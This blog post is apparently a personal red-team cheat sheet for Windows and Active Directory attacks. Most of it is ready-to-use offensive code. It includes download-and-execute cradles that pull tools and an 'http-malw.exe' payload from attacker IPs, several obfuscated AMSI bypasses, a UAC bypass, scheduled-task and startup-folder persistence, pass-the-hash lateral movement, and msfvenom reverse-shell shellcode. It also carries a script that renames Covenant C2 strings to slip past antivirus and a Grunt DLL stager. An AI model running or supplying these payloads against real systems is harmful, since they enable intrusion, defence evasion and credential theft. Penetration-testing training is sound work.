---
title: "Notes" 
layout: "post"
---

This blog post has been updated based on some tools and techniques from Offensive Security’s PEN-300 course as well ad the CRTO course from Rastamouse. 
It should be useful in a lot of cases when dealing with Windows / AD exploitation. This is my quick and dirty cheat sheet. 


## Enumeration

# 0) PowerShell one-liners

.NET reflection allows an application to obtain information about loaded assemblies and the types defined within them, then even create and invoke new instances.

### Load PowerShell script reflectively
Proxy-aware:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```
Non-proxy aware:
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```
__Note:__ Again, this will likely get flagged 🚩. For opsec-safe download cradles, check out [CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)



### Load C# assembly reflectively

Ensure that the referenced class and main methods are Public before running this. Note that a process-wide AMSI bypass may be required for this, [check this out](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/)

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())

# Download and run Rubeus, with arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### Load DLL assembly reflectively 

The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:

```powershell
PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```


We could also encode the DLL to a base64 string and load it without it needing to be on disk: 🚩

```powershell
PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > $dllstring = [System.Convert]::ToBase64String($dll)
PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dllstring))
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

Or download the DLL from a remote location:

```powershell
PS > $dll = (new-object net.webclient).DownloadData("http://10.8.0.6/ReflectionDemo.dll")
PS > [System.Reflection.Assembly]::Load($dll)
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

You can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:

```powershell
PS > $malware = (new-object net.webclient).downloaddata("http://10.8.0.6/http-malw.exe")
PS > [System.Reflection.Assembly]::Load($malware)
```

__Note:__ .NET 4.8, Assembly.Load is AMSI-aware 🚩



### 1) Powershell AMSI Bypass

Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Obfuscation example for copy-paste purposes:

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another method could be to compile the C# bypass to a .NET DLL and use PowerShell to load it reflectively.

```powershell
PS C:\> $bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
PS C:\> [System.Reflection.Assembly]::Load($bytes)
GAC Version Location
--- ------- -------
False v4.0.30319
PS C:\> [Amsi]::Bypass()
PS C:\> Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program.
```

```powershell
# Base 64 AMSI bypass
	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
	```
	
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```


### 2) Powershell Oneliner

### 3) Applocker 

### 4) Powershell CLM & LAPS

#### PowerShell Constrained Language Mode
Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker.
You can identify you’re in constrained language mode by polling the following variable to get the current language mode. It will say FullLanguage for an unrestricted session, and ConstrainedLanguage for CLM. 

```powershell
$ExecutionContext.SessionState.LanguageMode
```

The constraints posed by CLM will block many of your exploitations attempts. One quick and dirty bypass is to use in-line functions, which sometimes works - if e.g. whoami is blocked, try the following:

```powershell
&{whoami}
```

#### LAPS 
We can use LAPSToolkit.ps1 to identify which machines in the domain use LAPS, and which domain groups are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.

```powershell
#Get computers running LAPS, along with their passwords if we're allowed to read those
Get-LAPSComputers
#Get groups allowed to read LAPS passwords
Find-LAPSDelegatedGroups
```


# PrivEsc

#### 1) PowerUp

```py
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII Allchecks.txt
```

If you want to invoke everything without touching disk, use something like this:

```py
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
```


#### 2) UAC Bypasses

Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 

```cpp
SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"

BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
```


# Persistence

##### 1) Classic Startup folder

Just drop a binary in current user folder, will trigger when current user signs in:

```py
"C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```
Or in the startup folder, requires administrative privileges but will trigger as SYSTEM on boot and when any user signs on:

```py
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

##### 2) Schedule Tasks

This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.

```powershell
function New-ScheduledTaskPersistence {

    $name = "Persistence"
  
    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At 11am `
        -RepetitionInterval (New-TimeSpan -Hours 4) `
        -RepetitionDuration (New-TimeSpan -Days 30)
  
      $action = New-ScheduledTaskAction `
        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
        -WorkingDirectory "C:\Windows\System32"
  
      Register-ScheduledTask `
        -TaskName $name `
        -Trigger $trigger `
        -Action $action `
        -Force
}
```
To execute this PowerShell script on the target, go to the Interact CLI, import and execute the powershell module 


```cpp
schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
```

##### 3) COM Hijacks

Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).

Process Monitor is part of the excellent Sysinternals Suite from Microsoft. It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives. Launch procmon64.exe on attacker-windows.

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/procmon.JPG">
</p>

Another great place to look for hijackable COM components is in the Task Scheduler.  Rather than executing binaries on disk, many of the default Windows Tasks actually use Custom Triggers to call COM objects.  
And because they're executed via the Task Scheduler, it's easier to predict when they're going to be triggered.

This simple powershell script can be used to achieve this operation. 

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
    if ($Task.Actions.ClassId -ne $null)
    {
        if ($Task.Triggers.Enabled -eq $true)
        {
            if ($Task.Principal.GroupId -eq "Users")
            {
                Write-Host "Task Name: " $Task.TaskName
                Write-Host "Task Path: " $Task.TaskPath
                Write-Host "CLSID: " $Task.Actions.ClassId
                Write-Host
            }
        }
    }
}
```

# Lateral Movement

##### WMIC Lateral Movement

```cpp
wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
```

# MSSQL databases

PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.

```py
# Get MSSQL databases in the domain, and test connectivity
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

# Try to get information on all domain databases
Get-SQLInstanceDomain | Get-SQLServerInfo

# Get information on a single reachable database
Get-SQLServerInfo -Instance 'sql-1.cyber.io,1433'

# Scan for MSSQL misconfigurations to escalate to SA
Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV

#PowerUpSQL automatically crawl database links
Get-SQLServerLinkCrawl -Instance 'sql-1.cyber.io,1433'

# Execute SQL query
Get-SQLQuery -Query "SELECT system_user" -Instance sql-1.cyber.io

# Run command (requires XP_CMDSHELL to be enabled)
Invoke-SQLOSCmd -Instance sql-1.cyber.io -Command "whoami" |  select -ExpandProperty CommandResults
Invoke-SQLOSCmd -Instance sql-1.cyberbotic.io -Command 'dir C:\' -RawResults

# Automatically find all linked databases
Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
```

# Domain Dominance

# Misc & Encoding

##### PeZOR Packing and Encoding 

```cpp
PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
```

##### Cat to base64 

```cpp
cat file.ps1 | iconv -t utf-16le | base64 -w 0
powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
```

##### Powershell to base64

```cpp
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
``` 

##### Hex Encode 

```py
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
xxd -i encmeter.bin
```

##### Default MSF bin

```py
msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
```

##### PS memory 

```powershell
$string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
echo $encodedcommand
```

##### Impacket
Impacket is a collection of Python classes for working with network protocols
```py
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED a.user@10.10.120.1
```

# Obfuscation
	
### 1) Covenant use case - modified default dropper

First of all we will clone the main Covenant repository into our local machine. Furthermore we will modifiy some of the default word used by Covenat 
(Grunt, Jitter, Stage0, etc) in order to alter AV signature scanning capabilities. The bash script to automate this process is presented below:

```sh
sudo git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /home/kali/Desktop/red/Covenant

cd /home/kali/Desktop/red/Covenant/Covenant

mv ./Data/AssemblyReferences/ ../AssemblyReferences/
mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/
mv ./Data/EmbeddedResources/ ../EmbeddedResources/
mv ./Models/Covenant/ ./Models/LazyMonkey/
mv ./Components/CovenantUsers/ ./Components/LazyMonkUsers/
mv ./Components/Grunts/ ./Components/Monks/
mv ./Models/Grunts/ ./Models/Monks/
mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/MonkBridge/
mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/MonkHTTP/
mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/MonkSMB/
mv ./Components/GruntTaskings/ ./Components/MonkTaskings/
mv ./Components/GruntTasks/ ./Components/MonkTasks/
mv ./Data/Grunt/ ./Data/Monk/

find ./ -type f -print0 | xargs -0 sed -i "s/Grunt/Monk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/GRUNT/MONK/g"
find ./ -type f -print0 | xargs -0 sed -i "s/grunt/monk/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/covenant/lazymonk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Covenant/LazyMonk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/COVENANT/LAZYMONK/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ExecuteStager/ExcLev1/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/REPLACE_PROFILE/REP_PROF/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/REPLACE_PIPE/REP_PIP/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/GUID/ANGID/g"
find ./ -type f -print0 | xargs -0 sed -i "s/SetupAES/ConfAES/g"
find ./ -type f -print0 | xargs -0 sed -i "s/SessionKey/Sekey/g"
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedChallenge/EncChall/g"
find ./ -type f -print0 | xargs -0 sed -i "s/DecryptedChallenges/decryptchall/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Body/Body1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Response/Response1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Bytes/Bytes1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Body/Body2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Response/Response2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Bytes/Bytes2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Body/Body3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Response/Response3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Bytes/Bytes3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/message64str/mesage64str/g"
find ./ -type f -print0 | xargs -0 sed -i "s/messageBytes/messAgEbytes/g"
find ./ -type f -print0 | xargs -0 sed -i "s/totalReadBytes/rebytes/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/inputStream/instr/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/outputStream/outstr/g"
find ./ -type f -print0 | xargs -0 sed -i "s/deflateStream/deflatestream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/memoryStream/memorystream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/packdbyt/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/REPLACE_/REP_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_PROFILE_/_PROF_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_VALIDATE_/_VAL_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ProfileHttp/prohttp/g"
find ./ -type f -print0 | xargs -0 sed -i "s/baseMessenger/bAsemEsSenger/g"

find ./ -type f -print0 | xargs -0 sed -i "s/PartiallyDecrypted/pdecry/g"
find ./ -type f -print0 | xargs -0 sed -i "s/FullyDecrypted/fuldecry/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/packedbytes/g"

find ./ -type f -print0 | xargs -0 sed -i "s/CookieWebClient/MonksWebClient/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/CookieContainer/KekseContains/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/GetWebRequest/webreq/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Jitter/JItter/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ConnectAttempts/tentativeconn/g"
find ./ -type f -print0 | xargs -0 sed -i "s/RegisterBody/RegBody/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/messenger/messaggio/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Hello World/Its me, Mario/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ValidateCert/valCer/g"
find ./ -type f -print0 | xargs -0 sed -i "s/UseCertPinning/certpin/g"
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedMessage/encmsg/g"
find ./ -type f -print0 | xargs -0 sed -i "s/cookieWebClient/monkwebclient/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes/cryva/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes2/cryva2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array5/ar5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array6/ar6/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array4/ar4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array7/ar7/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array1/ar1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array2/ar2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array3/ar3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list1/l1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list2/l2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list3/l3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list4/l4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list5/l5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group0/g0/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group1/g1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group2/g2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group3/g3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group4/g4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group5/g5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group6/g6/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group7/g7/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group8/g8/g"



find ./ -type f -name "*Grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Grunt/Monk/g")";
	mv "${FILE}" "${newfile}";
done
find ./ -type f -name "*GRUNT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/GRUNT/MONK/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/grunt/monk/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*Covenant*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Covenant/LazyMonk/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*COVENANT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/COVENANT/LAZYMONK/g")";
	mv "${FILE}" "${newfile}";
done

#find ./ -type f -name "*covenant*" | while read FILE ; do
#	newfile="$(echo ${FILE} |sed -e "s/covenant/monkcommand/g")";
#	mv "${FILE}" "${newfile}";
#done

mv ../AssemblyReferences/ ./Data/ 

mv ../ReferenceSourceLibraries/ ./Data/ 

mv ../EmbeddedResources/ ./Data/ 

dotnet build
dotnet run

```

__Note:__ Please modify the script accordingly with your needs 🚩

 
The new Covenant instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default Covenant Listener Profile. 
Once the modified C# Monkstager has been downloaded it is possible to add further obfuscation using a combination or both of the following tools: 

```cpp
Just another way to declare modified strings 
{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}";'
{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}".Replace("-","");'
```

- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions for a C# visual studio project.


- [NET-Obfuscate:](https://github.com/BinaryScary/NET-Obfuscate) Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender
 


### 2) Covenant DLL Export

From Covenant we can create a Grunt DLL that has an export compatible with rundll32. 

- In Covenant, select the Binary Launcher and Generate a new __Grunt__. Then click the Code tab and copy the __StagerCode__.

- Open Visual Studio and create a new __Class__ __Library__ __(.NET __Framework)__ project. Delete everything in Class1.cs and paste the __StagerCode__.

- Go to Project > Manage NuGet Packages. Click Browse and search for __UnmanagedExports__. Install the package by Robert Giesecke.

- Collapse the __GruntStager__ class and add the following Export class underneath.

```cpp
public class Exports
{
  [DllExport("GruntEntry", CallingConvention = CallingConvention.Cdecl)]
  public static void GruntEntry(IntPtr hwnd,
  IntPtr hinst,
  string lpszCmdLine,
  int nCmdShow)
  {
    new GruntStager();
  }
}

```

Add using statements for __System.Runtime.InteropServices__ and __RGiesecke.DllExport__. 

Open the __Configuration__ __Manager__ and create a New Solution Platform for __x64__ (and x86 if you require).

Now build the proect then copy the DLL to the target machine and execute with __rundll32__ as follow

```sh
rundll32.exe GruntDll.dll,GruntEntry
```

Now you should have your shell.

### 3) Covenant Custom C2C Profile